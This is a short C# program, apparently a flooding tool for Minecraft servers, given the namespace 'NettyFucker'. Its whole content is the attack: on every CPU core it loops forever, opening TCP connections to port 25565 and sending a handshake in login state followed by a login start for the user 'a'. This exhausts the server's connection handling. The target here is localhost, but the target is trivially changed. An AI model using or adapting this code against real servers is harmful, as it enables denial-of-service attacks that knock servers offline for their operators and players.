using System.Net.Sockets;

namespace NettyFucker
{
    public class Program
    {
        static void Main(string[] args)
        {
            Parallel.For(0, Environment.ProcessorCount, i =>
            {
                while (true)
                {
                    TcpClient client = new("localhost", 25565);
                    Client minecraftClient = new(client);
                    minecraftClient.SendHandshake("localhost", 25565, 340, 2); // 2 indicates login state
                    minecraftClient.SendLoginStart("a");
                }
            });
        }
    }
}